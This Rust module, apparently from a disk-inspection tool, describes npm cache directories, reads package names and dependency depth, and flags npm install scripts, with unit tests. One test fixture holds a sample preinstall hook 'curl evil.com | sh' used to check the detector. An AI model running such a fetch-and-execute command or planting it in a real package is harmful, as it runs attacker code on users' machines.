use super::MetadataField;
use std::path::Path;

pub fn semantic_name(path: &Path) -> Option<String> {
    let name = path.file_name()?.to_string_lossy().to_string();

    match name.as_str() {
        "_cacache" => Some("Content Cache".to_string()),
        "_logs" => Some("Install Logs".to_string()),
        "_npx" => Some("npx Cache".to_string()),
        _ => {
            // Hash directories inside _npx: read package.json for package name
            if path.is_dir() {
                if let Some(pkg) = npx_package_name(path) {
                    return Some(pkg);
                }
            }
            None
        }
    }
}

/// Read package.json inside an npx hash dir to find the package name.
fn npx_package_name(path: &Path) -> Option<String> {
    let pkg_json = path.join("package.json");
    let content = std::fs::read_to_string(pkg_json).ok()?;

    // Look for "_npx": { "packages": ["name"] }
    // Simple JSON parsing without a dependency
    if let Some(npx_pos) = content.find("\"_npx\"") {
        let rest = &content[npx_pos..];
        if let Some(pkg_pos) = rest.find("\"packages\"") {
            let pkg_rest = &rest[pkg_pos..];
            // Find the array contents
            if let Some(bracket_start) = pkg_rest.find('[') {
                if let Some(bracket_end) = pkg_rest.find(']') {
                    let array_str = &pkg_rest[bracket_start + 1..bracket_end];
                    let packages: Vec<&str> = array_str
                        .split(',')
                        .map(|s| s.trim().trim_matches('"').trim())
                        .filter(|s| !s.is_empty())
                        .collect();
                    if packages.len() == 1 {
                        return Some(format!("[npx] {}", packages[0]));
                    } else if packages.len() > 1 {
                        return Some(format!(
                            "[npx] {} (+{} more)",
                            packages[0],
                            packages.len() - 1
                        ));
                    }
                }
            }
        }
    }

    // Fallback: look at dependencies
    if let Some(deps_pos) = content.find("\"dependencies\"") {
        let rest = &content[deps_pos..];
        if let Some(brace_start) = rest.find('{') {
            if let Some(brace_end) = rest.find('}') {
                let deps_str = &rest[brace_start + 1..brace_end];
                let dep_names: Vec<&str> = deps_str
                    .split(',')
                    .filter_map(|entry| {
                        let parts: Vec<&str> = entry.splitn(2, ':').collect();
                        if parts.len() == 2 {
                            Some(parts[0].trim().trim_matches('"').trim())
                        } else {
                            None
                        }
                    })
                    .filter(|s| !s.is_empty())
                    .collect();
                if dep_names.len() == 1 {
                    return Some(format!("[npx] {}", dep_names[0]));
                } else if dep_names.len() > 1 {
                    return Some(format!(
                        "[npx] {} (+{} more)",
                        dep_names[0],
                        dep_names.len() - 1
                    ));
                }
            }
        }
    }

    None
}

pub fn package_id(path: &Path) -> Option<super::PackageId> {
    let pkg_json = path.join("package.json");
    let content = std::fs::read_to_string(pkg_json).ok()?;
    let name = extract_json_field(&content, "name")?;
    let version = extract_json_field(&content, "version")?;
    if name.is_empty() || version.is_empty() {
        return None;
    }
    Some(super::PackageId {
        ecosystem: "npm",
        name,
        version,
    })
}

fn extract_json_field(json: &str, key: &str) -> Option<String> {
    let pattern = format!("\"{}\"", key);
    let pos = json.find(&pattern)?;
    let rest = &json[pos + pattern.len()..];
    let colon = rest.find(':')?;
    let after_colon = rest[colon + 1..].trim_start();
    if after_colon.starts_with('"') {
        let start = 1;
        let end = after_colon[start..].find('"')?;
        return Some(after_colon[start..start + end].to_string());
    }
    None
}

pub fn metadata(path: &Path) -> Vec<MetadataField> {
    let mut fields = Vec::new();
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();

    match name.as_str() {
        "_cacache" => {
            fields.push(MetadataField {
                label: "Contents".to_string(),
                value: "npm content-addressable cache".to_string(),
            });
            let content_dir = path.join("content-v2");
            if content_dir.exists() {
                fields.push(MetadataField {
                    label: "Format".to_string(),
                    value: "content-v2 + index-v5".to_string(),
                });
            }
        }
        "_logs" => {
            fields.push(MetadataField {
                label: "Contents".to_string(),
                value: "npm install/update logs".to_string(),
            });
            if let Ok(entries) = std::fs::read_dir(path) {
                let count = entries.filter_map(|e| e.ok()).count();
                fields.push(MetadataField {
                    label: "Log files".to_string(),
                    value: count.to_string(),
                });
            }
        }
        _ => {}
    }

    // For packages inside node_modules: show dependency depth and install scripts
    let path_str = path.to_string_lossy();
    if path_str.contains("node_modules") {
        // Dependency depth
        let depth = dep_depth(path);
        fields.push(MetadataField {
            label: "Dep depth".to_string(),
            value: if depth == 0 { "direct".to_string() } else { format!("transitive (depth {})", depth) },
        });

        // Install script detection
        if let Some(scripts) = detect_install_scripts(path) {
            fields.push(MetadataField {
                label: "⚠ Scripts".to_string(),
                value: scripts,
            });
        }
    }

    fields
}

/// Count how many node_modules levels deep this package is.
/// Direct dependency = 0, transitive = 1+.
fn dep_depth(path: &Path) -> usize {
    let path_str = path.to_string_lossy();
    // Count occurrences of /node_modules/ after the first one
    path_str.matches("node_modules").count().saturating_sub(1)
}

/// Detect install scripts (preinstall, install, postinstall) in package.json.
fn detect_install_scripts(path: &Path) -> Option<String> {
    let pkg_json = path.join("package.json");
    let content = std::fs::read_to_string(pkg_json).ok()?;

    let mut found = Vec::new();
    for script_name in &["preinstall", "install", "postinstall"] {
        // Look for "scriptname": in the scripts block
        let pattern = format!("\"{}\"", script_name);
        if content.contains(&pattern) {
            // Verify it's inside a "scripts" block (rough check)
            if let Some(scripts_pos) = content.find("\"scripts\"") {
                let rest = &content[scripts_pos..];
                if rest.contains(&pattern) {
                    found.push(*script_name);
                }
            }
        }
    }

    if found.is_empty() {
        None
    } else {
        Some(found.join(", "))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn semantic_name_cacache() {
        assert_eq!(semantic_name(&PathBuf::from("/npm/_cacache")), Some("Content Cache".into()));
    }

    #[test]
    fn semantic_name_npx() {
        assert_eq!(semantic_name(&PathBuf::from("/npm/_npx")), Some("npx Cache".into()));
    }

    #[test]
    fn semantic_name_npx_hash_with_package() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("abc123");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{"dependencies":{"lighthouse":"^12"},"_npx":{"packages":["lighthouse"]}}"#,
        ).unwrap();

        assert_eq!(semantic_name(&hash_dir), Some("[npx] lighthouse".into()));
    }

    #[test]
    fn semantic_name_npx_hash_with_multiple_packages() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("def456");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{"_npx":{"packages":["create-react-app","typescript"]}}"#,
        ).unwrap();

        let result = semantic_name(&hash_dir).unwrap();
        assert!(result.contains("[npx] create-react-app"), "{}", result);
        assert!(result.contains("+1 more"), "{}", result);
    }

    #[test]
    fn semantic_name_npx_hash_no_package_json() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("xyz");
        std::fs::create_dir_all(&hash_dir).unwrap();
        assert_eq!(semantic_name(&hash_dir), None);
    }

    #[test]
    fn package_id_from_node_modules() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("_npx/abc/node_modules/express");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name": "express", "version": "4.21.0"}"#,
        ).unwrap();

        let id = package_id(&pkg_dir).unwrap();
        assert_eq!(id.name, "express");
        assert_eq!(id.version, "4.21.0");
        assert_eq!(id.ecosystem, "npm");
    }

    #[test]
    fn dep_depth_direct() {
        let path = PathBuf::from("/home/user/.npm/_npx/abc/node_modules/express");
        assert_eq!(dep_depth(&path), 0);
    }

    #[test]
    fn dep_depth_transitive() {
        let path = PathBuf::from("/home/user/.npm/_npx/abc/node_modules/express/node_modules/qs");
        assert_eq!(dep_depth(&path), 1);
    }

    #[test]
    fn dep_depth_deep_transitive() {
        let path = PathBuf::from("/npm/_npx/a/node_modules/a/node_modules/b/node_modules/c");
        assert_eq!(dep_depth(&path), 2);
    }

    #[test]
    fn detect_install_scripts_postinstall() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("esbuild");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"esbuild","version":"0.27.2","scripts":{"postinstall":"node install.js"}}"#,
        ).unwrap();

        assert_eq!(detect_install_scripts(&pkg_dir), Some("postinstall".to_string()));
    }

    #[test]
    fn detect_install_scripts_multiple() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("suspicious");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"sus","scripts":{"preinstall":"curl evil.com | sh","postinstall":"node setup.js"}}"#,
        ).unwrap();

        let scripts = detect_install_scripts(&pkg_dir).unwrap();
        assert!(scripts.contains("preinstall"), "{}", scripts);
        assert!(scripts.contains("postinstall"), "{}", scripts);
    }

    #[test]
    fn detect_install_scripts_none() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("safe");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"safe","scripts":{"test":"jest","build":"tsc"}}"#,
        ).unwrap();

        assert_eq!(detect_install_scripts(&pkg_dir), None);
    }

    #[test]
    fn detect_install_scripts_no_scripts_block() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("minimal");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"minimal","version":"1.0.0"}"#,
        ).unwrap();

        assert_eq!(detect_install_scripts(&pkg_dir), None);
    }
}
